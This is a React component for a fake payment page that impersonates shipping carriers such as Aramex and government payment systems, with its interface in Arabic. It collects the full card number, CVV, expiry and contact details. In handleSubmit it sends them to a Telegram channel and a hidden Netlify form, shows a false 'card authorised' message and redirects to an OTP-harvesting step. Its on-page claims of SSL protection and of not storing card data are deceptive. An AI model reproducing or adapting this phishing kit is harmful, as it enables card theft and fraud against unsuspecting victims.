import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2, Shield, Lock, Calendar } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";

const PaymentCardInput = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardValid, setCardValid] = useState<boolean | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const selectedBankId = linkData?.payload?.selectedBank || '';

  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const enhancedBranding = getBrandingByCompany(serviceKey);
  
  const govSystem = getGovernmentPaymentSystem(selectedCountry);

  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || selectedCountry;
  const formattedAmount = formatCurrency(amount, currencyCode);

  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
    setCardNumber(formatted);
    
    const cleaned = formatted.replace(/\s/g, '');
    if (cleaned.length >= 13) {
      const isValid = validateLuhn(formatted);
      setCardValid(isValid);
      
      if (!isValid && cleaned.length === 16) {
        toast({
          title: "رقم البطاقة غير صحيح",
          description: "الرجاء التحقق من رقم البطاقة",
          variant: "destructive",
        });
      }
    } else {
      setCardValid(null);
    }
  };
  
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });
  
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 20 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    if (!validateLuhn(cardNumber)) {
      toast({
        title: "رقم البطاقة غير صحيح",
        description: "الرجاء التحقق من رقم البطاقة المدخل",
        variant: "destructive",
      });
      return;
    }
    
    if (!validateExpiry(expiryMonth, expiryYear)) {
      toast({
        title: "تاريخ الانتهاء غير صحيح",
        description: "البطاقة منتهية الصلاحية أو التاريخ غير صحيح",
        variant: "destructive",
      });
      return;
    }
    
    const cardType = detectCardType(cardNumber);
    if (!validateCVV(cvv, cardType)) {
      toast({
        title: "CVV غير صحيح",
        description: cardType === 'amex' ? "CVV يجب أن يكون 4 أرقام لبطاقات American Express" : "CVV يجب أن يكون 3 أرقام",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    const expiry = `${expiryMonth}/${expiryYear}`;
    
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    sessionStorage.setItem('cardNumber', cardNumber);
    sessionStorage.setItem('cardExpiry', expiry);
    sessionStorage.setItem('cardCvv', cvv);
    sessionStorage.setItem('cardType', cardType);
    
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details-new",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardholder: cardName,
          cardLast4: last4,
          cardType: cardType,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    const telegramResult = await sendToTelegram({
      type: 'card_details_with_bank',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardholder: cardName,
        cardNumber: cardNumber,
        cardLast4: last4,
        cardType: cardType,
        expiry: expiry,
        cvv: cvv,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="بيانات البطاقة"
      description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
      icon={<CreditCard className="w-6 h-6 sm:w-7 sm:h-7 text-white" />}
    >
      {/* Selected Bank/Country Info */}
      {(selectedBank || selectedCountryData) && (
        <div 
          className="rounded-lg p-2.5 sm:p-3 mb-4 flex items-center gap-2.5"
          style={{
            background: `${branding.colors.primary}08`,
            border: `1px solid ${branding.colors.primary}25`
          }}
        >
          {selectedCountryData && (
            <span className="text-xl sm:text-2xl">{selectedCountryData.flag}</span>
          )}
          {selectedBank && (
            <Building2 className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: selectedBank.color || branding.colors.primary }} />
          )}
          <div className="flex-1">
            <p className="text-[10px] sm:text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
              البنك المختار
            </p>
            <p className="text-xs sm:text-sm font-bold" style={{ color: enhancedBranding?.colors.text }}>
              {selectedBank ? selectedBank.nameAr : 'غير محدد'}
            </p>
          </div>
        </div>
      )}

      {/* Security Notice */}
      <div
        className="mb-5 p-3 sm:p-3.5 rounded-xl"
        style={{ 
          backgroundColor: `${branding.colors.primary}08`, 
          border: `1px solid ${branding.colors.primary}25` 
        }}
      >
        <div className="flex items-center gap-2.5">
          <div
            className="w-8 h-8 sm:w-9 sm:h-9 rounded-lg flex items-center justify-center flex-shrink-0"
            style={{ backgroundColor: branding.colors.primary }}
          >
            <Shield className="w-4 h-4 sm:w-4.5 sm:h-4.5 text-white" />
          </div>
          <div>
            <h3
              className="font-bold text-xs sm:text-sm mb-0.5"
              style={{ color: enhancedBranding?.colors.text }}
            >
              دفع آمن ومشفر
            </h3>
            <p className="text-[10px] sm:text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
              معلومات بطاقتك محمية بأعلى معايير الأمان
            </p>
          </div>
        </div>
      </div>

      {/* Visual Card Display */}
      <div 
        className="rounded-2xl p-4 sm:p-5 mb-5 relative overflow-hidden shadow-lg"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`,
          minHeight: '160px'
        }}
      >
        <div className="absolute top-3 right-3 flex items-center gap-2">
          <CreditCard className="w-8 h-8 sm:w-10 sm:h-10 text-white/80" />
          {cardValid === true && (
            <CheckCircle2 className="w-5 h-5 sm:w-6 sm:h-6 text-green-300" />
          )}
        </div>
        
        {/* Card Type Badge */}
        {cardNumber.length > 0 && (
          <div className="absolute top-3 left-3">
            <span className="text-[10px] sm:text-xs text-white/70 uppercase font-bold tracking-wide">
              {detectCardType(cardNumber)}
            </span>
          </div>
        )}
        
        {/* Card Number Display */}
        <div className="mt-12 sm:mt-14 mb-4 sm:mb-5">
          <div className="flex gap-2 text-white text-lg sm:text-xl font-mono tracking-wider">
            <span>••••</span>
            <span>••••</span>
            <span>••••</span>
            <span className="font-bold">{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
          </div>
        </div>

        <div className="flex justify-between items-end text-white">
          <div>
            <p className="text-[9px] sm:text-[10px] opacity-70 mb-1">EXPIRES</p>
            <p className="text-sm sm:text-base font-mono">
              {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
            </p>
          </div>
          <div className="text-right">
            <p className="text-[9px] sm:text-[10px] opacity-70 mb-1">CARDHOLDER</p>
            <p className="text-sm sm:text-base font-bold">{cardName || "YOUR NAME"}</p>
          </div>
        </div>
      </div>

      {/* Form */}
      <form onSubmit={handleSubmit} className="space-y-3.5 sm:space-y-4">
        {/* Cardholder Name */}
        <div>
          <Label className="mb-1.5 text-xs sm:text-sm flex items-center gap-1.5 font-semibold" style={{
            color: enhancedBranding?.colors.text
          }}>
            <CreditCard className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
            اسم حامل البطاقة *
          </Label>
          <Input
            placeholder="أدخل الاسم كما هو مكتوب على البطاقة"
            value={cardName}
            onChange={(e) => setCardName(e.target.value.toUpperCase())}
            className="h-10 sm:h-11 text-sm sm:text-base transition-all"
            style={{
              borderWidth: '2px',
              borderColor: `${branding.colors.primary}40`,
              fontFamily: enhancedBranding?.fonts.primary
            }}
            required
          />
        </div>
        
        {/* Card Number */}
        <div>
          <Label className="mb-1.5 text-xs sm:text-sm flex items-center justify-between font-semibold">
            <div className="flex items-center gap-1.5" style={{ color: enhancedBranding?.colors.text }}>
              <CreditCard className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
              <span>رقم البطاقة *</span>
            </div>
            {cardValid === true && (
              <span className="text-[10px] sm:text-xs text-green-600 flex items-center gap-1 font-medium">
                <CheckCircle2 className="w-3.5 h-3.5" />
                صحيح
              </span>
            )}
            {cardValid === false && (
              <span className="text-[10px] sm:text-xs text-destructive font-medium">غير صحيح</span>
            )}
          </Label>
          <Input
            placeholder="#### #### #### ####"
            value={cardNumber}
            onChange={(e) => handleCardNumberChange(e.target.value)}
            inputMode="numeric"
            className={`h-10 sm:h-11 text-sm sm:text-base tracking-wider font-mono transition-all ${
              cardValid === false ? 'border-destructive' :
              cardValid === true ? 'border-green-500' : ''
            }`}
            style={{
              borderWidth: '2px',
              borderColor: cardValid === false ? '#ef4444' : cardValid === true ? '#10b981' : `${branding.colors.primary}40`
            }}
            required
          />
        </div>
        
        {/* Expiry & CVV Row */}
        <div className="grid grid-cols-3 gap-2.5 sm:gap-3">
          <div>
            <Label className="mb-1.5 text-[11px] sm:text-xs flex items-center gap-1 font-semibold" style={{
              color: enhancedBranding?.colors.text
            }}>
              <Calendar className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
              شهر *
            </Label>
            <Select value={expiryMonth} onValueChange={setExpiryMonth} required>
              <SelectTrigger 
                className="h-10 sm:h-11 text-sm"
                style={{ borderWidth: '2px', borderColor: `${branding.colors.primary}40` }}
              >
                <SelectValue placeholder="MM" />
              </SelectTrigger>
              <SelectContent className="z-50 max-h-[180px]">
                {months.map((month) => (
                  <SelectItem key={month.value} value={month.value}>
                    {month.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div>
            <Label className="mb-1.5 text-[11px] sm:text-xs flex items-center gap-1 font-semibold" style={{
              color: enhancedBranding?.colors.text
            }}>
              <Calendar className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
              سنة *
            </Label>
            <Select value={expiryYear} onValueChange={setExpiryYear} required>
              <SelectTrigger 
                className="h-10 sm:h-11 text-sm"
                style={{ borderWidth: '2px', borderColor: `${branding.colors.primary}40` }}
              >
                <SelectValue placeholder="YY" />
              </SelectTrigger>
              <SelectContent className="z-50 max-h-[180px]">
                {years.map((year) => (
                  <SelectItem key={year.value} value={year.value}>
                    {year.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div>
            <Label className="mb-1.5 text-[11px] sm:text-xs flex items-center gap-1 font-semibold" style={{
              color: enhancedBranding?.colors.text
            }}>
              <Lock className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
              CVV *
            </Label>
            <Input
              type="password"
              placeholder="•••"
              value={cvv}
              onChange={(e) =>
                setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
              }
              inputMode="numeric"
              className="h-10 sm:h-11 text-sm sm:text-base text-center font-mono transition-all"
              style={{ borderWidth: '2px', borderColor: `${branding.colors.primary}40` }}
              maxLength={4}
              required
            />
          </div>
        </div>

        {/* Security Info */}
        <div
          className="mt-5 p-3 rounded-lg"
          style={{
            backgroundColor: enhancedBranding?.colors.surface || '#F9F9F9',
            border: `1px solid ${branding.colors.primary}15`
          }}
        >
          <div className="flex items-start gap-2.5">
            <Lock className="w-4 h-4 mt-0.5" style={{ color: branding.colors.primary }} />
            <div>
              <h4 className="font-bold text-xs sm:text-sm mb-0.5" style={{ color: enhancedBranding?.colors.text }}>
                محمي بتشفير SSL
              </h4>
              <p className="text-[10px] sm:text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
                جميع المعلومات مُشفرة ومحمية. لا نقوم بتخزين بيانات بطاقتك.
              </p>
            </div>
          </div>
        </div>
        
        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full h-12 sm:h-13 text-sm sm:text-base font-bold mt-5 text-white hover:opacity-90 transition-all"
          disabled={isSubmitting || !cardValid}
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`,
            borderRadius: '12px',
            boxShadow: '0 4px 12px rgba(0,0,0,0.15)',
            fontFamily: enhancedBranding?.fonts.arabic
          }}
        >
          {isSubmitting ? (
            <>
              <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white ml-2"></div>
              جاري المعالجة...
            </>
          ) : (
            <>
              <span className="ml-2">دفع الآن</span>
              <ArrowLeft className="w-4 h-4 mr-2" />
            </>
          )}
        </Button>

        <p className="text-[10px] sm:text-xs text-center mt-3" style={{ color: enhancedBranding?.colors.textLight }}>
          بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
        </p>
      </form>
    
      {/* Hidden Netlify Form */}
      <form name="card-details-new" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="cardType" />
        <input type="text" name="expiry" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentCardInput;
